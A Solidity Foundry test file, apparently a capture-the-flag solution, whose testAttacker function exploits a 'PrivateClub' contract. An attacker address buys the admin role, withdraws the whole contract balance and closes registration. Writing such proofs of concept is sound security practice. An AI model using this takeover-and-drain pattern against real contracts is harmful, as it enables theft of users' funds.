// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract PrivateClubTest is Test {
    PrivateClub public privateClub;
    address attacker;
    address member1;
    address member2;
    address newAdminMemebr;
    address newAdminMember1;
    address newAdminMember3;
    event lenn(uint256);
    event PaymentReceived(uint256);

    function setUp() public {
        privateClub = new PrivateClub();
    }

    function testAttacker() public {
        privateClub.setRegisterEndDate(block.timestamp + 10 days);
        privateClub.addMemberByAdmin(newAdminMemebr);
        privateClub.addMemberByAdmin(newAdminMember1);

        vm.prank(member1);
        // fund memners
        vm.deal(member1, 7 ether);
        vm.deal(attacker, 10 ether);

        address[] memory members = new address[](2);
        members[0] = member1;
        members[1] = member2;
        privateClub.becomeMember{value: 2 ether}(members);
        members[1] = attacker;
        uint256 count = privateClub.membersCount();
        address[] memory newMembers = new address[](3);
        newMembers[0] = members[0];
        newMembers[1] = members[1];
        newMembers[2] = attacker;

        privateClub.becomeMember{value: 3 ether}(newMembers);
        /** The Attacker Take the Ownership and stop future Registeration */
        vm.startPrank(attacker);
        privateClub.buyAdminRole{value: 10 ether}(member1);
        privateClub.adminWithdraw(attacker, address(privateClub).balance);
        privateClub.setRegisterEndDate(block.timestamp);
        vm.stopPrank();

        /** Check for Fail Condition */
        uint256 count1 = privateClub.membersCount();
        address[] memory willNotBeAddedMember = new address[](4);
        willNotBeAddedMember[0] = members[0];
        willNotBeAddedMember[1] = members[1];
        willNotBeAddedMember[2] = attacker;
        willNotBeAddedMember[3] = address(3);
        vm.prank(member1);
        vm.expectRevert("registration closed");
        privateClub.becomeMember{value: 4 ether}(members);

        
    }
}
